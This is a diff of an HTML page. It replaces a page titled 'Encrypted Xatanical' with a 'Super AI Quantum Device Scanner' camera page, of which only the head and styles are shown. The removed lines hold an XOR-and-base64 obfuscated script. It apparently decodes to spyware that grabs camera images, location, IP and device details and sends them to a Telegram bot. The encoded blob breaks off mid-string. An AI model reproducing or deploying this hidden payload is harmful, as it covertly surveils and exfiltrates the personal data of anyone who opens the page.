@@ -1,17 +1,498 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Encrypted Xatanical</title>
+  <meta charset="UTF-8">
+  <title>Super AI Quantum Device Scanner</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
+  <style>
+    :root {
+      --primary: #2ecc71;
+      --secondary: #3498db;
+      --hologram: rgba(46, 204, 113, 0.2);
+    }
+    body { 
+      font-family: 'Courier New', monospace;
+      text-align: center; 
+      padding: 20px; 
+      background: #0a0a0a;
+      color: var(--primary);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      background-image: radial-gradient(var(--hologram) 1px, transparent 1px), radial-gradient(var(--hologram) 1px, transparent 1px);
+      background-size: 50px 50px;
+      background-position: 0 0, 25px 25px;
+    }
+    .hologram-effect {
+      position: fixed;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, rgba(0,255,255,0.1) 25%, transparent 25%), linear-gradient(-45deg, rgba(255,0,255,0.1) 25%, transparent 25%), linear-gradient(45deg, transparent 75%, rgba(0,255,255,0.1) 75%), linear-gradient(-45deg, transparent 75%, rgba(255,0,255,0.1) 75%);
+      background-size: 20px 20px;
+      pointer-events: none;
+      mix-blend-mode: overlay;
+      opacity: 0.3;
+      z-index: 9999;
+      animation: hologram 20s linear infinite;
+    }
+    @keyframes hologram {
+      from { transform: translate(-50%, -50%) rotate(0deg); }
+      to { transform: translate(-50%, -50%) rotate(360deg); }
+    }
+    .scanner-box { position: relative; width: 300px; height: 300px; margin: 0 auto; overflow: hidden; }
+    .scanner-box video { width: 100%; height: 100%; object-fit: cover; }
+    .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: linear-gradient(to right, transparent, var(--primary), transparent); animation: scanLine 3s linear infinite; z-index: 2; }
+    @keyframes scanLine { 0% { top: 0; } 100% { top: 100%; } }
+    
+    /* New styles for additional features */
+    .info-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      text-align: left;
+      margin-top: 20px;
+      max-width: 600px;
+    }
+    .info-item {
+      padding: 8px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 4px;
+      border-left: 2px solid var(--primary);
+    }
+    .info-label {
+      font-weight: bold;
+      color: var(--secondary);
+      font-size: 0.9em;
+    }
+    .info-value {
+      font-size: 0.85em;
+      word-break: break-all;
+    }
+    .advanced-toggle {
+      margin: 15px 0;
+      background: transparent;
+      color: var(--secondary);
+      border: 1px solid var(--secondary);
+      padding: 5px 10px;
+      border-radius: 15px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+    }
+    .advanced-info {
+      display: none;
+      width: 100%;
+      max-width: 600px;
+      margin-top: 15px;
+    }
+    .permission-badge {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.7);
+      color: #0f0;
+      padding: 5px 10px;
+      border-radius: 3px;
+      font-size: 12px;
+      z-index: 10000;
+      border: 1px solid #0f0;
+    }
+  </style>
 </head>
 <body>
-<script>
-function xorDecrypt(str, key) {
-  return str.split('').map(c => String.fromCharCode(c.charCodeAt(0)^key)).join('');
-}
-const encoded = "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